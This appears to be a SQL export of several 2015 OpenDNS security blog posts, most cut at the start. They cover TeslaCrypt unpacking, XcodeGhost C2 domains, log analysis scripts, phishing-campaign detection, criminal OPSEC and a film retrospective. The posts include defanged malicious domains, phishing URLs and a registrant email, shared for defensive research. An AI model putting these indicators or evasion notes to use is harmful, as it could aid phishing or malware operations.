TeslaCrypt presents itself with a love letter of sorts, claiming to have protected your files with encryption just for you; but in reality, it was a little nefarious — more like a letter from a disgruntled ex.\nAlthough TeslaCrypt claimed to be using an asymmetric key, Talos found that this was not the case. TeslaCrypt was using a symmetric key and thus could be used to decrypt the encrypted files, and the tool Talos released would do just that. A lot happens in five months.\nBack at the lab\nWhen new samples of TeslaCrypt came through OpenDNS Security Labs, it became apparent that something had changed when our auto-analysis failed. Some updates on our analysis system fixed the problems, but we were curious to find out what else had changed — TeslaCrypt had earned itself a revisit.\nAfter running the sample through dynamic analysis a few times and making note of file and registry changes, running processes, and network traffic, we made a quick run through a debugger, setting software breakpoints on VirtualAlloc, and hardware breakpoints on the memory that had been allocated to follow through any unpacking. After inserting a few EBFEs (jump to self) in key locations to get around anti-debugging code, unbelievably, the sample unpacked itself into allocated memory through a call to RtlDecompressBuffer as a complete binary. No rebuilding of import tables, no entry point searching, and no problem at all to dump the allocated memory to disk and add a ‘.exe’ extension. Analysis could now begin on the unpacked binary.\nStrings were now readily available:\n\nLook familiar?\nIn reading the analysis from the Talos blog, I noticed that the all-important ‘key.dat’ file necessary to decrypt files using their tool was not dropped in this version. Great, every time the Jedi get a leg up, the dark side has to come along and restore the balance.  Was there any hope? Unlike the versions analyzed by Talos, which dropped the ‘key.dat’ file, and ‘log.html’ (a manifest of your losses), this version was dropping an HTML and text version of your ransom note, a file named ‘Recovery_File_[random].txt’, and a new key in the registry. Looking for some relations between the files was not a disappointment:\n\nClicking through the payment links reveal yet another — the string is the bitcoin address for ransom payment:\n\n\nWith this many things lining up so far, was it possible that only enough modifications were made to neuter the Talos tool? The bitcoin address was not the only thing in the registry key and a closer look was necessary:\nTeslaCrypt registry entry mapped along side the recovery file it creates.\nThe recovery file that was dropped mapped quite well to the contents of the registry key. According to the Talos blog, the recovery file is what is necessary to get your files back if you were not connected to the internet (or were unable to contact the C&C servers) at the time of infection. If the first string is the bitcoin address, and the last string is the registry key the remaining data can be found at, what purpose would the other two strings have other than somehow generating the decryption key?\nTeslaCrypt decryptor\nLooking at the source code from the Talos decryption tool, the components necessary to successfully decrypt a file are as follows:\nencrypted file\n\ncontains initialization vector\ncontains original file size\ncontains encrypted file\n\n\ncipher key\n\ncontained within key.dat\nA quick look at the encrypted files pre- and post-encryption showed there was no difference in file size, so the initialization vector was no longer in the encrypted file and the original file size was no longer a necessary detail. If the cipher key was within the registry key or the recovery file, then the Talos decryption tool only requires a slight modification.\nOpenDNS Security Labs is already working closely with Talos to update the decryption tool with the required modifications.

Malware allows them to package exploits and exfiltration functionality together, making it easier for them to compromise a large number of users quickly and efficiently, before signature-based protections are updated or key indicators of compromise (IOCs) are recognized by the security community.\nReversing encrypted malware, via OpenDNS Security Labs\nBut just as malware authors have learned to modify file signatures to evade detection by antivirus engines, there are some indications that there is a new shift in behavior that may be taking place to avoid detection by increasingly sophisticated defenses.\nCompromise: Easy as “CVE” & “RDP”\nIn early September, InfoWorld writer Fahmid Rashid reported on what may be a growing trend towards increased malware-less intrusions. Exploiting known software vulnerabilities, weak user authentication schemes, or default passwords to compromise a machine are techniques as old as hacking itself. But this article and others provide anecdotal evidence that attackers are increasingly returning to their “roots” and using legitimate administrator tools on compromised machines to pivot through target networks, compromise additional endpoints and ultimately exfiltrate data.\nBasic mistakes (such as default user accounts or misconfigured servers) can be exploited to obtain administrator (or “root”) access and carry out further attacks. As a recent Cisco Security blog post about the “SYNful Knock” malware outlines, attackers are increasingly looking for ways to obtain administrator credentials that will allow them to conduct ongoing attacks against target companies. These credentials could also easily be used to wipe data, change network settings or access data from compromised systems.\nOnce an attacker has compromised an endpoint, there are a laundry list of methods that can be used to exfiltrate data, but perhaps none are as notorious as RDP, or the Remote Desktop Protocol. RDP comes bundled with most versions of the Windows operating system and provides configurable remote access for users. Over the years, it has gained a well-earned reputation as one of the most commonly-used tools for both remotely exploiting and exfiltrating data from a target. A simple web search for “RDP” and “exfiltration” reveals dozens of infosec conference talks and how-to articles on using RDP for this purpose. When RDP isn’t available on a target machine, IRC, FTP and HTTP are all options in an attacker’s arsenal, as well. File synching services such as Dropbox are another option for attackers and are more likely to be found on target machines as cloud applications become increasingly ubiquitous in the enterprise.\nCountermeasures: Start with the Basics\nThis revival of old school hacking techniques also reflects the fundamental security challenge of differentiating between “good” and “bad” behavior. At its core, malware is software that reduces or circumvents a system’s security, often by exploiting the legitimate services, libraries, and processes of a target operating system. Cisco’s Talos research team recently pointed out in a blog post that sometimes there can be an extensive gray area between truly malicious malware and software that exhibits malware-like behavior.\nThe simple ability to install new software or connect to a remote machine, for instance, is something that can be easily turned to an attacker’s advantage, and in the end it doesn’t matter if this ability is achieved by dropping an implant on a target machine or by exploiting a web application vulnerability and then escalating user privileges.\nThe basic countermeasures for denying hackers the ability to exploit weak authentication or known vulnerabilities haven’t changed much from a decade ago: patch often, use two-factor authentication, train your employees to recognize phishing and monitor your networks for anomalous behavior. But in an age of “branded” vulnerabilities and overhyped attack campaigns, it’s worth noting that the methods of compromising targeted networks continue to evolve and evade detection by infosec analysts and engineers.', 'Blog;Uncategorized', 'https://umbrella.cisco.com/blog/2015/09/24/hackers-are-returning-to-their-roots-infosec-should-too/');

If we’re just trying to find the bad stuff calling out to the bad places, we don’t need much more than domain names, so we will isolate that part of the file.\nThe most useful logs we get from a usability perspective is one in CSV format. If you’re running some version of MS Office, Excel will try to open this kind of file. However, it’s not recommended as Excel can only handle so much data before eating all the memory in a system and seizing up. We almost exclusively work in the command prompt and with Python scripts.\nCSV is actually text, but the values are comma separated, which means maybe just a couple fewer lines of typing. If we have a log file in CSV format, it might look like this when viewed through the terminal:\n(from actual logs – we changed the source IP address)\nTo get just the domains, we can run the ‘awk’ command to print a specific column. For these lines, the domain contact is in column seven, with each column separated by commas. The command to type in this case is:\ncat example.txt | awk -F, \'{print $7}\'\nwhich prints the following:\nThis can be sent to a file for use during the analysis portion, like so:\ncat example.txt | awk -F, \'{print $7}\' > justthedomains.txt\nThat was an easy example. Often, the logs are much more complex. As an example, here are some of the top lines from a two gigabyte file:\n(source IP addresses changed)\nWe need to get the domains out of this file too, but first we have to remove these unnecessary fields from the top using Vim:\n#Software: SGOS 6.5.5.1\n#Version: 1.0\n#Start-Date: 2015-09-07 09:00:00\n#Date: 2015-09-03 16:22:16\n#Fields: date time time-taken i <snip>\nWe are now left with a large file of lines that look like this:\n2015-09-07 09:00:02 169 192.168.1.223 - - - OBSERVED \"Technology/Internet\" - 200 TCP_NC_MISS POST image/jpeg http search.namequery.com 80 / - - \"Mozilla/5.0 (compatible; MSIE 8.0;)\" 10.251.106.45 239 233 - \"none\" \"none\"\nContinuing forward to get just those domains, columns of information for each line are separated by spaces, so we can grab the domains using ‘awk’ again. The ‘awk’ command automatically uses the space as a file delimiter, so we don’t have to specify a different delimiter like in the CSV example (we used the ‘-F,’ switch to use a comma as the delimiter in that example).\nThat didn’t go so well. The lines are not in perfect columns. It looks like we will have to find a different way to grab those domains.\nThe following python script achieves what we want:\nimport re\nfrom urlparse import urlparse\nwith open(\'DNS_logs.log\') as f:\nfor eachline in f:\nurlsearch = re.findall(r\'(https?://S+)\', eachline)\nurl = str(urlsearch).replace(\'[\'\',\'\').replace(\'\']\',\'\').replace(\'[]\',\'\')\nurl_components = urlparse(url)\nif \"http\" in url_components:\njustthedomain =  url_components.netloc\nprint justthedomain\nHere are the results (of just a small part) after running the script:\nWe’re left with a list of domains, some of which are duplicates (because they’re contacted multiple times by the client machines). To make processing faster during the analysis stage, we want to remove duplicates. Assuming we ran the python script and sent its output to a text file called domains.txt, we can then get just the unique domains:\nsort -u domains.txt\nIf that list is sent to a new file called unique_domains.txt, we can then run the domains through OpenDNS Investigate using its API to get all kinds of information, including domain score (which determines if a domain is considered malicious or benign), Whois details, ASN information, related domains, and more.\nUsing the Investigate API is straightforward and well documented. Investigate makes it possible to send a list of domains (we have sent millions at a time) using urllib2, receive a JSON document and parse through it, writing the results to a file for quick analysis.\nGoing over everything that’s possible with the Investigate API is beyond this post, but the following example demonstrates how to gather Whois information for a domain. We’ll be using a domain from the CSV file we first looked at: monarchestatemanagement[.]com\nfrom urllib2 import Request,\nurlopen import json api_key = \'Your Investigate API Key\'\nheaders = {\'Authorization\': \'Bearer \' + api_key}\nrequest = Request(\'https://investigate.api.opendns.com/whois/monarchestatemanagement.com.json\', headers=headers)\nresponse_body = urlopen(request).read()\nvalues = json.loads(response_body)\nprint values[\'registrarName\'] + \',\' + values[\'expires\']\nRunning this prints the fields we requested, the registrar and the expiration date:\nWe are able to acquire more information than just Whois on our list of domains with the Investigate API. Using the same domain as in the previous example, the original logs show allowed communication to monarchestatemanagement[.]com. However, looking at it with Investigate API, we learn that this domain would have been blocked if they were using OpenDNS (the screenshot is from the web interface for Investigate):\nLog analysis doesn’t have to be boring. This is really just the tip of the iceberg.\nWe are always exploring new ideas in this area. One of the more interesting ways we look at logs is by sending them with Logstash to an ElasticSearch cluster for visual analysis with Kibana.\nThe technologies are out there to enable you to get out of your text editor and into a better place.', 'Incident Response;Open Source;Security Community;Security Graph;Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2015/09/22/log-analysis-with-opendns/');

Unit 42 initially discovered that the malware had infected 39 iOS apps (a number that keeps climbing and is north of 50 apps at time of publishing) potentially impacting hundreds of millions of users by embedding malicious code into specific iOS apps.\nClaud Xiao, author of the technical blog post, states that the XcodeGhost code embedded into infected iOS apps is capable of receiving commands from the attacker through a C2 server to prompt a fake alert dialog to phish user credentials, hijack opening specific URLs based on their scheme (which could allow for exploitation of vulnerabilities in the iOS system or other iOS apps), and read and write data in the user’s clipboard (which could be used to read the user’s password if that password is copied from a password management tool).\nAccording to a BBC News article, researchers at the e-commerce site Alibaba initially flagged the malware. It was discovered that the hackers had uploaded several altered versions of Xcode — a tool used to build iOS apps — to a Chinese cloud storage service. Then, about six months ago, the attackers posted links to the software on several forums commonly visited by Chinese developers.\nLet’s take a look at the C2 domains in question from the perspective of the OpenDNS Global Network Infrastructure.\nThe first domain associated with XcodeGhost is init[.]crash-analytics[.]com. As you can see from the OpenDNS Investigate details below, we observed very few queries over the the past 30 days.\n\nThe registrant for this domain utilizes a Tencent QQ, popularly known as QQ, email address. Past investigations have shown that QQ accounts (both instant messaging and email) are relatively easy to register and require very little validation of an individual’s authenticity.\n\nThe IP address and name servers for this domain are on different networks that, although common, becomes an indicator to note.\nThe second domain, init[.]icloud-diagnostics[.]com, has noticeably more traffic and a dramatic upswing in queries starting September 11.\n\nA look at the WHOIS information for this domain shows that the domain was registered by the same individual that registered init[.]crash-analytics[.]com.\n\nIf we pivot on the registrant email address we can see that 18 known domains are associated with this registrant. Some interesting slightly suspiciously named domains include allsdk[.]org, ioscode[.]org, iossdk[.]org, iostool[.]com, sdkdev[.]net, and sdkdev[.]org.\n\nThis domain has also recently changed from using an Amazon AWS CNAME (which will surface later in this post) to the same IP address hosting init[.]crash-analytics[.]com.\n\nAs we can see, this IP address is hosting several domains owned by the registrant.\n\nPivoting on the IP address, which is located in Singapore, we can see that it is associated with AS 63949, which is owned by hosting provider Linode.\nThe third domain, init[.]icloud-analysis[.]com, shows the most significant spike in queries of the three. As you can see below, the query volume accelerates on September 11 and peaks over 330,000 queries.\n\nThat is until the query volume normalizes on September 13 at 10:00am GMT.\n\nUnlike the other two domains the WHOIS information does not show the same registrant email address or name server information. We can note, however, that at one time all three domains had an @domainsbyproxy.com registrant email address which can be used to draw a loose association between the domains.\n\nWhat we do see, however, is the reappearance of the Amazon AWS CNAME that was previously associated with init[.]icloud-diagnostics[.]com, effectively associating these domains with one another.\n\nIf we pivot on the CNAME associated with the domain, we see a significant spike in traffic on the day it was associated with the init[.]icloud-analytics[.]com domain.\n\nIf we take a look at the co-occurrences and related domains for init[.]icloud-analysis[.]com we can see several Apple app-related names emerge, several of which are associated with apps identified as being compromised by the XcodeGhost malware. These include, NetEase, Perfect365, Qyer, and WeChat, in addition to domains associated with app publishers like TickTockApps (creator of Wallpapers10000), which also have been identified as compromised.\n\nIt’s been reported that the majority of people affected were in China and our own data corroborates this claim using OpenDNS Investigates Requester Geo Distribution metric.\n\nUnsurprisingly, however, we notice substantial queries originating from the US, Australia, Canada, Brazil, India, Vietnam, Italy, and Great Britain – all of which are countries with a sizable Chinese-speaking populations.\nUsing OpenDNS Investigate we’ve walked through an investigation, or rather corroboration of, findings from a third party. Perhaps the biggest benefit is that we didn’t have to utilize a number of disparate systems to do so. The next step in our investigation will likely be to take a look at those suspiciously named SDK domains also owned by the malicious registrant.

Our team has since been focused on other projects, like taking ownership of and consolidating one of the oldest parts of our infrastructure called the landers, which freed up more than 70 servers as a result — as well as some exciting new features we’ll talk about when it’s time.\nToday I want to go over the Intelligent Proxy — and the technology that powers it — in little more detail, namely Nginx.\nConventionally a proxy is configured explicitly, either in your OS’s network settings or within a particular program, like Chrome or Firefox in case of HTTP proxying.\n\n\nIn addition, protocols are in place to ensure the proxy server can always determine what the client’s intended destination was at the time of the request. But as Yariv explained in his post, we’ve taken an unconventional approach and instead of proxying everything (explicit or not) we selectively re-route requests to suspicious domains to our proxy via the DNS layer. This selectivity is great for reducing latency, load, and impact but it also introduces some interesting engineering challenges — mainly around identifying users and determining what was the original destination.\nFor example, when a user tries to browse to “some-website.net,” the OpenDNS resolvers return the IP address of the nearest Intelligent Proxy server if the domain is classified as suspicious. The client, e.g. Firefox or Chrome, has no knowledge of this and assumes the IP address it received belongs to the server actually hosting “some-website.net.” In the case of plain HTTP, it’s easy to determine what the original destination was, because HTTP/1.1 requires the Host header to be set with each HTTP request, and modern browsers will correctly include this header. Shared hosting providers, as an example, rely on this header when serving multiple websites behind a single IP. Similarly, HTTPS traffic can be proxied by taking advantage of the Server Name Indication (SNI) extension of the TLS protocol. The process is more complex (even impossible) for other ports and protocols.\nAnother important concept is the idea of a “forward” proxy vs a “reverse” proxy. A forward proxy serves a group of clients, acting as a single point of access and querying origin server(s) on behalf of the clients. This is the type of proxy you use when configuring one in your OS or in a browser like Firefox, as mentioned earlier.\nA reverse proxy does the opposite and acts as a single point of access for multiple server components, such as CGI scripts, file servers, or databases. These proxies are also commonly used as load balancers and SSL termination points.\nBased on this, our Intelligent Proxy is a forward proxy when it comes to serving client requests that have been routed to it. But it also has some reverse proxying to do internally, especially as we add new features and new layers of data inspection. I had also mentioned at the beginning that the technology we chose is Nginx, and readers familiar with Nginx will know it’s designed to be purely a reverse proxy.\nI’ll discuss some more of the unconventional approaches we’ve taken as a result, and challenges we had to solve, in my next post.', 'Security;Security Engineering', 'https://umbrella.cisco.com/blog/2015/09/18/lets-talk-about-proxies/');

However, OpenDNS Security Labs researcher Anthony Kasza illustrated in an interview earlier this week that in many cases the same trends that allow criminals to scale their operations make it easier than ever to expose them.\nThe Risky Business of Cybercrime\nThe fundamental conflict for cybercriminals, Kasza said, comes from the need for criminals to reach out and attack others to make money. But financially-motivated criminals need to keep their profit-making activities as low profile as possible to avoid arrest.\n“It’s all about your strategy,” he said. “If you’re financially motivated, it’s just like a business. You need some kind of strategy for making money off of it. You can scam people. You can be a provider that sells [malware] installs to someone else. You can have a big botnet, and the only way that you make money off of it is by sending spam. No matter how criminals turn a profit, the very act of running a botnet or distributing malware exposes their infrastructure to scrutiny.”\nHackers that go for broke with large operations tend to draw attention from international law enforcement agencies. The history of botnet takedowns contains many examples of how high-profile criminal networks have done so. The Ramnit and Citadel botnets were both examples of how size and volume of financially-motivated crime eventually brings their demise.\n“You can adopt the strategy of ‘hit really hard, really big’ or you can adopt the strategy of ‘death by a thousand duck bites,’” Kasza said, noting that after a high-profile data breach criminals likely need to “go underground for a while” to avoid attracting attention.\nKasza also noted that complexity is another barrier to criminals hiding their activities online. Essentially, today’s financially-motivated criminals assume all of the overhead of running their business — such as staff, capital expenses, and working with third-party vendors — but without widely advertising their operations. They also operate without the legal protections that most of the legitimate economy relies on to do business.\n“Think about [cybercrime] like a business,” he said. “Would someone want to develop their own malware in-house, or do they want to buy it from someone? If they buy it from someone, there’s still a risk that their vendor is going to mess up, which often leaves them with no recourse.”\nHe added that even in jurisdictions where cybercrime is tolerated, criminals can face significant operational setbacks when law enforcement seizes servers, sinkholes command-and-control domains, or a security company reverse engineers their malware.\nBad OPSEC sinks ships… and botnets (image via Wikimedia Commons)\nSometimes, these operational setbacks can persist for years. In July of last year for instance, security researchers were able to quickly connect a new malware campaign with attempts to resurrect the Gameover ZeuS botnet due to similarities in the code base between different generations of the malware.\nWorking with other criminals introduces even more operational hazards. In recent years, a laundry list of high-profile hacker groups and criminal operations, from Lulzsec to the group behind the Heartland Payment Systems breach, have been exposed by informants.\nFighting on Others’ Turf\n“[Criminals] have to play Blue Team while they’re attacking someone,” said Kasza. “If you think about the way that boxing works, you can hit someone really hard, but you have to still make sure that you’re protecting yourself from getting hit, because if you miss, it’s not going to be fun for you.”\nTaking the comparison back to business, Kasza said that the OPSEC best practices for criminal organizations parallel those of legitimate companies.\n“If you get an ISO 27001 certification, you have to get to follow a set of best practices,” he said. “Same thing in cybercrime. Even criminals try to follow their own best practices as far as securing and monitoring their own infrastructure. The smart ones do that so if researchers come and start poking at their infrastructure, they can burn it all down and start over.”\nIn the end, though, it seems that the same basic security hygiene that is important (but hard to do well) for today’s businesses is often just as hard for cybercriminals when they operate over long periods of time.\n“You can do things easily, or you can do things right,” he said. “That’s what OPSEC is. It’s the balance between doing things the disciplined, painfully meticulous way and doing things the quick and easy way. Good OPSEC is difficult. The one time you slip up, you’re going to get caught. So you have to be really strict and disciplined.”', 'Blog;Security 101;Uncategorized', 'https://umbrella.cisco.com/blog/2015/09/17/how-bad-guys-hide-online-part-two/');

With an explosion of new technology available in the 80s and 90s, a new genre, cyberpunk, arose to house these characters and lifestyle. According to Lawrence Person, a science fiction author and editor, “cyberpunk” focused on “characters [who] were marginalized, alienated loners who lived on the edge of society in generally dystopic futures where daily life was impacted by rapid technological change, an ubiquitous datasphere of computerized information, and invasive modification of the human body.”\nThe movies that have endured as fan favorites and cult classics took hacker culture and distilled it for mass consumption, adding a dash of good looking celebrity and enough technical fudging to keep the story light. One such film at the vanguard of these mainstream hacker epics was “Hackers,” and this week it turns 20 years old.\nThe film stars Angelina Jolie in one of her first roles and Johnny Lee Miller as a hacking whiz kid, who crashed 1,507 systems at the tender age of 11. The action of Hackers centers on a convoluted plotline involving the malicious machinations of the Ellingson Mineral Company security officer who goes by “The Plague.” The surprisingly prescient nod to the dangers of ICS/SCADA systems lend a modern dose of reality to an otherwise downright silly movie.\nAlthough the subliminal cut scenes and overwrought “dives” into the inner workings of the machines and operating systems are pure ’90s sensationalism, “Hackers” inspired a generation — the generation that is now hitting the workforce — to learn more about the budding Internet and the technology that runs it, and to dream about breaking computers and phreaking phones.\nIn a post celebrating the movie’s 20th anniversary, writer Simon Chetrit said, “Despite being wildly inaccurate, the film was hugely inspiring to many members of Hack Manhattan for creating a certain mystique around hacking culture that other tech films never quite matched.” One of the Hack Manhattan crew added, “When I first saw this movie, I was inspired to learn about computer hacking. I actually learned Assembly because of this movie.”\nTo mark the 20-year milestone of “Hackers” and its contribution and inspiration to hacker culture, we used an app called Dubsmash and put together a short clip of our own hackers here at OpenDNS reenacting their favorite lines from the movie.\nEnjoy, and feel free to post your own by searching the hashtag #Hackers in the Dubsmash app, and share them on Twitter using the hashtag #HackersDub.\n\nHow has this movie, or other classic Hacker films such as “Sneakers,” “War Games,” or “Takedown,” shaped your view on the security industry?

Our model NLPRank detected the campaign of Facebook phishing sites spoofing Facebook under the second-level domain (2LD) 2nso3s[.]com.\nFor this particular domain, when visiting the 2LD, 2nso3s[.]com from your browser, you would be directed to a URL that looks like:\nhttp://facebook[.]com.accounts[.]login[.]userid[.]280964[.]2nso3s[.]com/wec/fbn/?next=http%3A%2F%2Fwww.facebook.com%2videos%2F%3A%4A%4ID%1A\nAs we can see in the path of the URL the next page routes you directly to the legitimate facebook[.]com after they have stolen the entered credentials. We also cross referenced this domain with our crowd-sourced system Phishtank, and found someone from the community submitted one of these hostnames.\nSomething to take note of here is that upon each subsequent request to the same FQDN, the third-level domain (3LD) appears to be rotating integers (indicative of fluxing domain name). Rotating subdomains is a technique similar to what Careto, also known as The Mask, malware uses. Here are some samples from Careto:\npaypal.com[.]0[.]security-confirmation[.]9f15ebd9884fb6a44f873d4bdf41aebc.hvh7[.]hyd[.]me\nwww[.]paypal.com[.]0[.]login-confirmation.account-security[.]979e0a277a1848104c3ee6b4bc928152.231[.]hyd[.]me\nwww[.]paypal[.]com[.]confirmation[.]account-security[.]dbf2b36a883bddda923a341409e6b8abdbf2b36a883bddda923a341409e6b[.]wsedw[.]hyd[.]me\npaypal[.]com[.]0[.]security-confirmation[.]fc1618c9ae39989770371191790a772b[.]er44.hyd[.]me\nThis domain hyd[.]me exhibits steady high volume traffic. In fact, it is a sinkholed domain by Kleissner & Associates, which has been acquired by LookingGlass.\n\nGoing back to our initial 2LD 2nso3s[.]com serving the Facebook phishing urls, what is also interesting is the massive traffic spike, which is typically uncharacteristic of phishing domains. Here is the traffic pattern for 2nso3s[.]com:\nFigure 1\n\nVisiting the domain in the browser shows that it is spoofing the Facebook login page:\nFigure 3a:\n\nFigure 3b:\n\n\nFigure 3c:\n\nOne can see from the above screenshots that the 3LD in the FQDN is rotating, this happens over tens of thousands of queries. Figure 4 shows another interesting catch exhibiting similar characteristics detected by the Spike and NLPRank models, ebayonline[.]cc:\nFigure 4\n\nThis sample one is also rotating through subdomains:\nseo28.ebayonline[.]cc\nseo115.ebayonline[.]cc\nseo159.ebayonline[.]cc\nHere is another sample of a spoofed brand domain that exhibits features detected by the 2 models, analytics-google[.]com:\nFigure 5\n\nThere are a lot of variations spoofing google-analytics, however they have much smaller request rate. For example, Figure 6 displays traffic from google–analytics[.]com:\nFigure 6\n\nAs we can see this spoofing domain has much lower traffic counts, which is more typical of phishing domains. Here is an example of a PayPal phish, mpaypaal[.]com, also exhibiting a low query count:\n\nWhen viewing the page we see the attacker copying the login for the original PayPal site and phishing for credentials:\n\nInvestigate and Visualization\nGoing back to 2nso3s[.]com, data visualization and Investigate can provide some further interesting insights into this domain.\nFirst of all, we can use our “Life of a Domain” visualization in order to get a better representation of the domain lifetime and all its key events. Let’s have a look:\n\nWe can see a couple of things. The two blue dots represent the domain registration and we can see here that our domain was registered pretty recently (mid-August 2015) and is scheduled to expire the following year. On this specific visualization, we typically see a couple of red circles showing when the domain was tagged/flagged by our analysts, which wasn’t the case here. (Of course, now it’s all blocked).\nWe can also see that our domain was registered with an address in Mexico. Interestingly, the client traffic comes mainly from the US, Russia, France, and the UK. We have the phone number and an email address, which allows us to dig deeper in our investigation.\nFrom the email address “mireyadreedjs@yahoo.com” and using the Investigate data, we can search our WHOIS database to discover which other domains were registered by the same account :\n2nso3s[.]com\n2nsoe93[.]com\n32nos35[.]com\n34scw3[.]com\n34swe2[.]com\n3sn39s[.]com\n3snose4[.]com\nan340sm[.]com\ndv324do[.]com\n23oens9[.]com\n23ud82[.]com\n349sln2[.]com\n3skd93[.]com\nFrom these domains, we can keep mining and discover subdomains, attached URLs, IP addresses, and even hashes of the malware hosted on these servers. We can then use all this correlating data and build a map of the full infrastructure of the phishing campaign. All of this operated very simply using our homemade data miner script (more about that in a later blog), and we can visualize the result in 3D with OpenGraphiti.\n\nOnce we’ve extracted and visualized all of these new candidates, we can use another interesting visualization called “Parallel Coordinates.” The idea is to represent the features of our candidates stacked all together in a graph representation. The horizontal axis represent the set of features of our vector (pictured here we have Investigate + VirusTotal features), the vertical one represents the values of those features taken by our vectors. See below :\n\nConsidering that this simple diagram is displaying 100 domains at the same time, we can instantly guess at first sight that they have a lot in common given the small distance between all the curves. We can see that these domains have a low popularity, which means those domains have seen a small amount of traffic. They have only been created about 10 days ago (the age axis is on a log scale), mapping to only one IP, one prefix, one ASN, and in only one country. They have a constant TTL set to a very high interval, about 90,000 seconds (TTL standard deviation is zero). The geographical distance between their IPs are small, which is expected since they have only one. The entropy of the domains is pretty high due to the DGA part of the name. The status is -1 for all of these, meaning that OpenDNS is actively blocking all of them at the moment. And finall,y they have 10 or more URLs that have been flagged on VirusTotal.\nDissecting hosting IP space\nWe can use our malicious IP space/rogue host monitoring models to investigate the hosting IP infrastructure of the 13 2LDs registered by mireyadreedjs@yahoo.com.

Combining NLPRank, Spike Detection, and the IP monitoring models provides a method to surface large-scale phishing campaigns and automatically block them in real time. Second, bulletproof or abused hosting providers persistently cater to a diversity of “badness” whether it is phishing, exploit kits, malware, or gray content in general. Our global visibility into the attack surface comes in handy to consistently monitor and rapidly catch these threats from different angles.\nIf you’d like to learn more about our research related to these topics, we will be presenting in October at BruCon and Hack.lu.\n“Unified DNS View to Track Threats”, Dhia Mahjoub and Thomas Mathew, at BruCon\n“A Collective View of Current Trends in Criminal Hosting Infrastructures”, Dhia Mahjoub, at Hack.lu', 'Big Data;Incident Response;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/09/14/phishing-spiking-and-bad-hosting/');

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1274, 'How Bad Guys Hide Online, Part One', 'Stephen Lynch', 'September 11, 2015', 'In part one of this two-part series, the OpenDNS Company Blog focuses on the common “bag of tricks” that criminals use to avoid detection online.\nInfosec experts often apply the phrase “know your enemy” when discussing the techniques used by malicious actors online. While every organization has its own unique threat model, the average sophistication level of financially-motivated attacks has increased in recent years. One of the reasons for the increase is the increasing availability of proven tools, infrastructure and operational techniques for carrying out successful attacks against business networks and endpoints.\nMath != Stealth\nBefore talking about how bad guys hide their activity online, a brief word about applied cryptography: it won’t be discussed in detail, here. Encryption is a complex topic that is best left up to professional cryptographers. It’s also only a small piece of the puzzle when it comes to identifying would-be online attackers, who can be identified through a variety of methods before, during and after an attack.\nObfuscation and Evasion\nMany modern information security systems have their roots in signature-based detection and blacklisting technologies that have been around for decades (antivirus being the most common example). To avoid detection, hackers rely on the ability to change malware signatures quickly in order to reuse the same piece of malware against a wide variety of targets.\nOne of the primary methods of disguising malware signatures is through the use of crypters. As a previous post on the OpenDNS Security Labs blog outlines, crypters allow criminals to rapidly change malware files:\nThese tools typically cut up the input file into pieces, encrypt them, and place them into another executable which has been specially crafted to reassemble the payload and have it run. These outer shells are updated multiple times per day to evade detection by security software, and many even employ server-side polymorphism on the malware repository, which means each individual victim will receive a distinct copy of the malicious file. It’s not hard to see why naive signature-based detection techniques cannot keep up with this style of distribution.\nStatis analysis of a Pushdo sample, courtesy of OpenDNS Security Labs\nCrypters have made it much easier for attackers to hide their malware from security solutions that rely on automated file signature matching. Essentially, the file signature is no longer based on the ability of a malware author to rewrite/recompile the code for each attack campaign, but on a third party specialist that sells crypter software, which can itself be reused. Since most financially-motivated crime tends to strives to compromise as many targets as possible (although there are exceptions), criminals have favored this method of disguising file signatures in recent years.\nNetwork-level obfuscation can also be accomplished through a number of methods to make an attacker’s traffic patterns and connections look random or disguise them as network traffic. From the same blog OpenDNS Security Labs blog post:\nPrevious versions of Pushdo have used DNS smokescreens, URL path randomization, and DGA fall back techniques for obscuring command and control (C2) communication.\nDomain generation algorithms (DGAs) are another common method of making it difficult to detect malicious network connections. As detailed elsewhere on this blog, DGAs can create hundreds or thousands of domains that a machine checks daily, which can be used as command-and-control nodes for botnets or other infected machines. Generally, a combination of randomness and volume is used to disguise which domains are really being utilized for malicious communications.\nBoth of these methods, however, do still leave a trail of clues that security researchers can follow. You can read about methods for defeating crypters and DGAs in the aforementioned Labs blog post and here.\nOld Fashioned OPSEC\nDo you want to pass a confidential message to a coworker that’s private and secure? First, walk over to them. Next, tell them your message, quietly. That’s it! No encryption or Tor Hidden Services required.\nOPSEC (operational security, in military parlance) is generic shorthand for the techniques people use to keep their plans or activities secret. Most OPSEC techniques can be decidedly low tech. For instance, sneakernets are one of the simplest ways of hiding your online activity — just stay offline. Accordingly, most of today’s online criminals try to keep activities like selling/purchasing crypters, renting time on botnets away from prying eyes, instead relying on Dark Web forums to carry out those activities.\nOther simple “operational hygiene” techniques are commonly used by bad guys to hid their activity, such as one-time use email addresses. For example, the use of overlapping email addresses for registering domains connected with the Angler exploit kit and Bedep botnet have led the research to link the these two pieces of malicious infrastructure.\nOne of biggest developments of the last decade has been the specialization and professionalization of cybercrime. Today’s financially-motivated online criminals have an array of services, providers, and infrastructure that they can utilize to carry out attacks. A criminal might purchase malware from an online forum, an exploit kit to deliver the malware, rent time on a botnet to deliver command-and-control instructions to compromised machines. Sometimes, these services will be bundled into a single turnkey solution, which allows criminals to easily scale their operations and go after more targets.\nBased on the writing of security blogger Brian Krebs, it seems that one of the biggest OPSEC problems for today’s criminals comes from simply having to operate businesses that caters to (and compete with) other criminals. Krebs has written extensively about several incidents where criminals have hacked one another.\nAlso, separation of providers makes it harder to keep OPSEC intact, every other “dumb customer” of a bulletproof hosting provider provides more information that infosec teams can use to zero in on the source of an attack. Dark Web forums also face a conundrum: in order to attract enough criminals to be useful, they still must be “known” to a certain subset of the criminal population. This very quality makes it difficult for these forums to avoid attracting attention from security researchers.\nJoin the OpenDNS Blog again next week, when we speak with OpenDNS Security Labs researcher Anthony Kasza about how researchers are finding new ways to uncover malicious behavior online.', 'Blog;Uncategorized', 'https://umbrella.cisco.com/blog/2015/09/11/how-bad-guys-hide-online-pt-one/');

